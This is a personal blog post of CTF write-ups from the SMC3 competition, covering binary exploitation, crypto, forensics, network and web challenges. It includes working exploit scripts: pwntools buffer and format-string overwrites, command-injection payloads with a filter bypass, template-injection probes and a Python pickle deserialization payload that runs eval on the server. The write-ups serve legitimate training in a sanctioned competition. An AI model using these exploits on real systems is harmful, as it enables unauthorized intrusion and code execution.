+++
title = "SMC3 CTF"
date = 2020-06-21

[taxonomies]
tags = ["ctf-writeups"]
+++


SMC3 was a CTF put on by the University of North Georgia and there were 14 students from each of the six senior military colleges competing.  I had a good time competing and I ended up placing in 3rd place!  I've included my writeups for the majority of challenges which I completed.  

<!-- more -->

# Binary Exploitation

## be01

The flag was stored inside the binary and could be retrieved with strings

`strings be01 | grep Flag`

flag: `sTriNGS-r-EZ-7819`

## be02

the provided source code printed out the flag when executed

`gcc be02.c; ./a.out`

flag: `c0mpILE-tIME_1822`

## bm01

the flag checks if one character in your input is b and if it is it will give you the flag

`python -c "print('b' * 79)" | nc ggcs-bm01.allyourbases.co 8134`

flag: `c0MinG-Up_bs-8788`


## bh02

simple constant stack canary.  The canary was `:)` and the loop terminated if the byte after it was `f`

```python
from pwn import *

context.terminal = ['termite', '-e']


# p = process('./bh02')
# p = gdb.debug("./bh02")
p = remote('ggcs-bh02.allyourbases.co', 8133)


buf_length = 0x50

payload = b'f' * 0x32 + b':)f'

print(p.recvuntil(":"))

p.sendline(payload)

p.interactive()
```

flag: `caNaRY-CoalMINE-2811`

## bh03

we don't have a binary for this one. The server it tells us to connect to gives us three functions to return to and then tells us the return pointer before exiting.  I used cyclic to determine that the correct offset was 45 and then wrote a python script to read the addresses in and overwrite the return pointers correctly.  After successfully returning to all three functions it gives us this text. 

```python
from pwn import *

p = remote("ggcs-bh03.allyourbases.co", 1337)

print(p.recvuntil(": "))
three = int(p.recvuntil("\n"),16)
print("function three: ", hex(three))

print(p.recvuntil(": "))
two = int(p.recvuntil("\n"),16)
print("function two: ", hex(two))

print(p.recvuntil(": "))
one = int(p.recvuntil("\n"),16)
print("function one: ", hex(one))

print(p.recvuntil("you?"))

payload = cyclic(49-4) + p32(three) + p32(two) + p32(one) + p32(three)

p.sendline(payload)

p.interactive()
```

`RmxhZzogUmV
UVE9mdW5jVGl
PTi0xOTkw`

I tried rot13 once and then stuck it into cyberchef and played around with it.  It ended up being base64


flag: `ReTTOfuncTiON-1990`

## bx01

what the fuck

`111111111111111111111111111%n`
made it print out
`Object validated, contents is 'Right now I would be number 1'`

???


```python
import itertools
import string
from multiprocessing import Pool
from pwn import *
import tqdm

def check(i):
    p = remote('ggcs-bx01.allyourbases.co', 9171)
    p.recvuntil("> ")
    p.sendline(''.join(i))
    res = p.recvline()
    if b'Invalid' not in res:
        print("with: ", i)
        print("result: ", res)


tasks = list(itertools.combinations(string.printable,2))

pool = Pool(processes=8)
for _ in tqdm.tqdm(pool.imap_unordered(check, tasks), total=len(tasks)):
    pass
```

i used this script to check every printable 2 char combination to find vulnerabilities.

flag: `tRUNkated-EveRYTHinG-6761`


## bm03

this exploit centered around a printf vulnerability which could be found in the transaction dialog.  After a valid transaction it would print out the user name directly through through printf and as such was vulnerable to a string format exploit.  

My exploit was in two parts - one to leak the stack address and program base and one to take advantage of the %n string formatter to write the address of the read_flag function to the saved return pointer. 

my first payload was `%x.%364$x` which leaked the address of a variable on the stack and a pointer to something in the program code.  I determined the offsets from the base and used these values to find the location of EBP in the account menu function and the program base.  

I then used a payload like `%{address of read_flag}x%333$hn` to overwrite the return pointer.  the 333rd "argument" pointer to the first four bytes of the reference argument so I sent the address of the return pointer as the reference argument.  The goal was to pad out the left with a bunch of spaces matching the address of read_flag.  This value would then be written to the return pointer, allowing me to read the flag.  

Once the return pointer was overwritten I just had to return and it would load read_flag.  

The server wasn't running aslr so my address leaking exploit ended up being useless.  Good thing because the server was slow and I couldn't manage to leak address and then get the flag in the same session.  

```python
from pwn import *

context.terminal = ['termite', '-e']

account_id_counter = 0

def recv_input():
	x = p.recvuntil(":>")
	# print(x)

p = process('./bm03', env = {"TERM": "xterm-256color", "SHELL": "/usr/bin/zsh"})
# p = remote('bm03.allyourbases.co', 9010)
# p = gdb.debug('./bm03', env = {"TERM": "xterm-256color", "SHELL": "/usr/bin/zsh"})

e = ELF('./bm03')

recv_input()
p.sendline('2')
recv_input()

# creating user to leak esp

p.sendline('%x.%{}$x'.format(91*4)) # 91*4 is stack offset to something in program memory 
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()


# log in
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 1

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 2

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

p.sendline('a')

# make transaction

p.sendline('2')
recv_input()

p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline('1')
recv_input()

p.sendline('1')
p.recvuntil('\'')
addrs = p.recvuntil('\'')[:-1]
addrs = [int(x,16) for x in addrs.split(b'.') if x not in b'']

p.sendline("")
recv_input()


p.sendline("")
p.sendline("0")
recv_input()
p.sendline("31337")
recv_input()


ebp = addrs[0] + 0x1b4
# ebp = 0xffffdb18
program_base = addrs[1] - 0xb203
# program_base = 0x56555000
saved_eip = ebp + 4
read_flag = program_base + e.symbols['_Z9read_flagv']
# print([hex(x) for x in addrs])
print("ebp: ", hex(ebp) )
print("program_base: ", hex(program_base))
print("read_flag: ", hex(read_flag & 0xfff))

# writing time

p.sendline('2')
recv_input()

# creating user to leak esp

base = '%{}$hn'.format(333)

pad = "%{}x".format((read_flag & 0xffff) - 0x15)
p.sendline(pad + base)
recv_input()
p.sendline('1')
recv_input()
p.sendline('2')
recv_input()
p.sendline('2')
recv_input()


# log in
p.sendline('1')
recv_input()
p.sendline('2')
recv_input()
p.sendline('2')
recv_input()

# create account 1

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

# create account 2

p.sendline('1')
recv_input()
p.sendline('1')
recv_input()

p.sendline('a')

# make transaction

p.sendline('2')
recv_input()

p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline(str(account_id_counter))
account_id_counter += 1
recv_input()
p.sendline('0')
recv_input()
p.sendline(p32(saved_eip) * 49)
recv_input()
p.sendline('')
recv_input()

p.sendline('0')

print(p.recvall())
```

flag: `FormattingMatters`

# Crypto

## ce01

we are provided the following ciphertext:

`IB EVMJGASVCJNM, C TRKTGIGRGIAB EIJNPV IT C OPGNAZ AQ PBEVMJGIBS KM YNIEN RBIGT AQ JWCIBGPHG CVP VPJWCEPZ YIGN EIJNPVGPHG, CEEAVZIBS GA C QIHPZ TMTGPO; GNP "RBIGT" OCM KP TIBSWP WPGGPVT (GNP OATG EAOOAB), JCIVT AQ WPGGPVT, GVIJWPGT AQ WPGGPVT, OIHGRVPT AQ GNP CKAXP, CBZ TA QAVGN. GNP VPEPIXPV ZPEIJNPVT GNP GPHG KM JPVQAVOIBS GNP IBXPVTP TRKTGIGRGIAB. GNP QWCS IT CTIOJWPTRKTGIGRGIAB`

I tried a caesar cipher first and when that didn't pan out I tried a substitution cipher which was correct.  The plaintext is and i used https://quipqiup.com/ to solve it:
```
IN CRYPTOGRAPHY, A SUBSTITUTION CIPHER IS A METHOD OF ENCRYPTING BY WHICH UNITS OF PLAINTEXT ARE REPLACED WITH CIPHERTEXT, ACCORDING TO A FIXED SYSTEM; THE "UNITS" MAY BE SINGLE LETTERS (THE MOST COMMON), PAIRS OF LETTERS, TRIPLETS OF LETTERS, MIXTURES OF THE ABOVE, AND SO FORTH. THE RECEIVER DECIPHERS THE TEXT BY PERFORMING THE INVERSE SUBSTITUTION. THE FLAG IS ASIMPLESUBSTITUTION
```

## ce02

we are provided the following text and told to figure out the flag.  I tried a few and cracked it a caesar cipher of shift 9

```
RW LAHYCXPAJYQH, J LJNBJA LRYQNA, JUBX TWXFW JB LJNBJA'B LRYQNA, CQN BQROC LRYQNA, LJNBJA'B LXMN XA LJNBJA BQROC, RB XWN XO CQN BRVYUNBC JWM VXBC FRMNUH TWXFW NWLAHYCRXW CNLQWRZDNB. RC RB J CHYN XO BDKBCRCDCRXW LRYQNA RW FQRLQ NJLQ UNCCNA RW CQN YUJRWCNGC RB ANYUJLNM KH J UNCCNA BXVN ORGNM WDVKNA XO YXBRCRXWB MXFW CQN JUYQJKNC. OXA NGJVYUN, FRCQ J UNOC BQROC XO 3, M FXDUM KN ANYUJLNM KH J, N FXDUM KNLXVN K, JWM BX XW. CQN VNCQXM RB WJVNM JOCNA SDURDB LJNBJA, FQX DBNM RC RW QRB YAREJCN LXAANBYXWMNWLN. CQN OUJP RB LJNBJAAXCBCQNKAJRW.
```

```
IN CRYPTOGRAPHY, A CAESAR CIPHER, ALSO KNOWN AS CAESAR'S CIPHER, THE SHIFT CIPHER, CAESAR'S CODE OR CAESAR SHIFT, IS ONE OF THE SIMPLEST AND MOST WIDELY KNOWN ENCRYPTION TECHNIQUES. IT IS A TYPE OF SUBSTITUTION CIPHER IN WHICH EACH LETTER IN THE PLAINTEXT IS REPLACED BY A LETTER SOME FIXED NUMBER OF POSITIONS DOWN THE ALPHABET. FOR EXAMPLE, WITH A LEFT SHIFT OF 3, D WOULD BE REPLACED BY A, E WOULD BECOME B, AND SO ON. THE METHOD IS NAMED AFTER JULIUS CAESAR, WHO USED IT IN HIS PRIVATE CORRESPONDENCE. THE FLAG IS CAESARROTSTHEBRAIN.
```

flag: `CAESARROTSTHEBRAIN`

## ce03

the provided files are:

```text
4870412d81d8af4b494c56462a4d684f24baee6f89627a995dfb6beccb404726e06ea8b99c9cbbe0b906ff5eec76ad602c85903f3e7f40156570cec56a19c244c3c69d9a00cbd4e9606288e1ea2e8b1f8bb1932d1ab67d0e9cb04de01adaac0a5e4558c90df8b519012d8d6a94a5c08e1d1dd81e07b8f2b6f87863290ad1c245530fa9894d9be8c8d2a1d8325a9bf1015180d3247130f170b3f5325c290f75b8eb2cf983443df33eedd6164c308674f21d6e47284983fc7132d056c1b34acc9c3d0bf62f9ea94e7f0cda7ab4d91d92089ccdcb1644f8390ddc27ef27f759870a53910a7407ea8c0896c73fd7841c2f75515512e0a6d4b912cd540b4c444c87a7
```

and `iamakeykeykeykey`

the first one is the encrypted flag and the second one is the key to solve it.  We are told it is some form of AES.  

i used https://www.devglan.com/online-tools/aes-encryption-decryption to get `The Advanced Encryption Standard (AES), also known by its original name Rijndael, is a specification for the encryption of electronic data established by the U.S. National Institute of Standards and Technology (NIST) in 2001. The flag is: RijNdaelMe-9912`


## ce04

we are provided with:

`Ulp Giysbssi ntpzsf wt e xptzcr cg iynrqdhwok lwpzopsumn eeph pm vwtyg s gsfjid zf abhssazgef Qostec nihvsft, fldev cb hii wptlsfg pj l veqkcfe. Me pmhzcmt e qzre ct dppjllhvopfxtn smpghjxfeigb.`

and a picture.  this picture is from the vignere cipher wikipedia page so I think we can conclude it is probably a vignere cipher.  

I used https://www.boxentriq.com/code-breaking/vigenere-cipher to solve it.  the plaintext is `the vigenere cipher is a method of encrypting alphabetic text by using a series of interwoven caesar ciphers based on the letters of a keyword it employs a form of polyalphabetic substitution` and the key is `bellasooo`

flag: `bellasooo`

# Forensics

## fe01

i used zip2john to convert the zip into a list of hashes and then cracked it with the provided wordlist

flag: `z1P-Cr4CK-0910`

## fe02

i used https://www.extractpdf.com/ to pull the text from the pdf which included the flag

flag: `cAnYOuReALLYSEEme-2322`

## fe03

the gif had an embedded ELF binary that printed out the flag.  I used binwalk to extract it

flag: `EMbEddedFiLEz_0819`

# Network


## ne01

i used nmap to scan all the open ports.  I had to use the `-p` flag to enable scanning ports above 1000 because the service with the flag was on port 6166. 

`nmap ggcs-ne01.allyourbases.co -Pn -p- -T5`


flag: `hunTingPoRTS_7727`

## nm01

```python
from pwn import *

p = remote('ggcs-nm01.allyourbases.co', 6167)

def solve():
    eq = p.recvuntil("=")[:-1]
    print(eq)
    result = eval(eq)
    print(p.recvline())
    print(result)
    p.sendline(str(result))


solve()
solve()

p.interactive()
```
# Web

## we01

https://ggcs-we01.allyourbases.co/

the blurb said that the flag was on some common directory and said to look for a list of common directories.  

I tossed a dirbuster at it and found a valid directory at https://ggcs-we01.allyourbases.co/sample/

the flag was at https://ggcs-we01.allyourbases.co/sample/flag.txt

flag: `bustING_direTORies_8918`

## we02

https://ggcs-we02.allyourbases.co/

the flag was hidden in one of the webpack js files - particularly https://ggcs-we02.allyourbases.co/component---src-pages-else-js-b41975d5a1f03391fee1.js

I saw it in the source code and noticed that it didn't get loaded.  After checking it out manually i found the flag.  

flag: `webPACkEd-AlRiGHT_7182`

## we03

https://ggcs-we03.allyourbases.co/

the blurb mentioned a secret page which made me think about robots.txt.  I checked it out and it had a disallow directive for https://ggcs-we03.allyourbases.co/61829201829023.html.  The flag was on that page. 

flag: `NO_CrAwLing_Plz_0192`

## we04

https://ggcs-we04.allyourbases.co/

There was some javascript making a request and passing the user agent.  I assumed that the purpose was to allow search engines to read it for SEO purposes.  I set my user agent to googlebot (`Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`) and it gave me the flag.  
flag: `CrawlING-So-SlOwLY-8199`

## wm01

https://ggcs-wm01.allyourbases.co/

basic shell command injection.  The flag could be read with `/root; cat .flag.txt`

flag: `unSAFE_eXecution_42`

## wm02

https://ggcs-wm02.allyourbases.co/index.html

I looked at the source and found that if you had a cookie name `login` with and id set but nothing else it would fill out the rest of the data.  I wrote a python script to incrementally try every number until 100.  The admin was id 33.  

```python
import requests
import json
url = "https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm02"
for i in range(100):
    r = requests.post(url, data = json.dumps({"id": i}))
    print(r.text)
```

flag: `IncREMentaLl_SessIoNs-1920`

## wm03

https://ggcs-wm03.allyourbases.co/

I tried a couple other user IDs with getUser but that didn't pan out.  I then tried to send a command to list users and it responsed with a list of commands
```json
        "commands": [
            "getUser",
            "setUser",
            "getFlag",
            "config"
        ]
```

I tried getFlag but it required an authentication token.  POSTing config responded with the token and then I was able to retrieve the flag. 

flag: `LAx_AUThEntiCaTION-:(`

## wh01

you can do command injection with `\n` and `\t` to bypass the blocked characters.  the flag is at /var/task/.../.flag.txt.  I hate this so much, i missed it the first time around and had to brute force every file on the system to find it.  

i used this script to make operation of it a little easier.  

```python
import json
import requests

url = "https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wh01"

while True:
    base_cmd = "/root\\n"
    cmd = base_cmd + input("> ")
    print(cmd)
    cmd = cmd.replace(" ","\\t")
    path = f"{{\"path\": \"{cmd}\"}}"
    print("path: ", path)
    # path = path.format()
    r = requests.post(url, data = path)
    print(r.json()['body'])
```

flag: `SCUffeD_FiLTERing_1000`

## wh02

I noticed that whenever displaying a 404 the page would show the path i failed to access.  I played around with it for a while trying out different injections until I noticed that `{{7 * 7}}` evaluated.  I then tried `{{/* locals() */}}` and received
```
It appears you got lost on the way to: /{'_Context__self': , 'dict': , 'lipsum': , 'cycler': , 'joiner': , 'namespace': , 'dir': , 'help': Type help() for interactive help, or help(object) for help about object., 'locals': , 'globals': , 'laksnd8quoqjknadaklsd9aodu892ja': 'Flag: tEmPlATes-R-FuNN-2391'} of None>, '_Context__obj': , 'args': (), 'kwargs': {}, '__traceback_hide__': True, 'fn': , 'fn_type': 'environmentfunction'}`
```

flag: `tEmPlATes-R-FuNN-2391`

## wh03

https://ggcs-wh03.allyourbases.co/

the website has a bunch of gross javascript and if it takes you more than 100 ms to skip the breakpoint it'll reload.  to bypass this I turned off javascript and then executed the relevant code manually.  I searched around the code until i saw something that looked like it printed the flag (the function u).  It required x to be equal to seq for it to print the flag so i cracked open the js console and set it manually, then called u().  


flag: `rANDom_VICTORy_113`


## wx01

https://ggcs-wx01.allyourbases.co/

python pickle deserialization exploit.  After noticing it was a pickle vuln from the stack trace i got when passing it a malformed data cookie, I wrote up a vuln to print the flag.  The flag was stored in a local variable so my exploit takes advantage of eval to execute code in the context of the server.  

```python
import pickle
import codecs
import base64
import os
class RCE:
    def __reduce__(self):
        return eval, ("{'name': flag}",)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE(), protocol=0)
    print(base64.urlsafe_b64encode(pickled))

```

flag: `suPER_SeRiAL-bR0_02891`
